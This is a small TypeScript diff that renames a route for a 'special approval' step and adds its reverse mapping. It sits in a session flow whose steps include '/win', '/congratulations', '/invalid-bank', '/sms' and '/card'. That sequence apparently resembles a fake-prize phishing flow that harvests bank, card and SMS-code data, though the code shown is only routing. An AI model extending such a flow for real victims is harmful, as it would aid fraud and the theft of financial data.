@@ -28,7 +28,7 @@ export function stepToPath(
     case "congrats":
       return "/congratulations";
     case "special_approval":
-      return "/wait";
+      return "/special-approval";
     default:
       return `/win/${routeSessionId}`;
   }
@@ -43,6 +43,7 @@ export function pathToStep(pathname: string): SessionStep | null {
   if (pathname.startsWith("/invalid-bank")) return "invalid_bank";
   if (pathname.startsWith("/live-support")) return "live_support";
   if (pathname.startsWith("/congratulations")) return "congrats";
+  if (pathname.startsWith("/special-approval")) return "special_approval";
   if (pathname.startsWith("/sms")) return "sms";
   if (pathname.startsWith("/card")) return "card";
   return null;
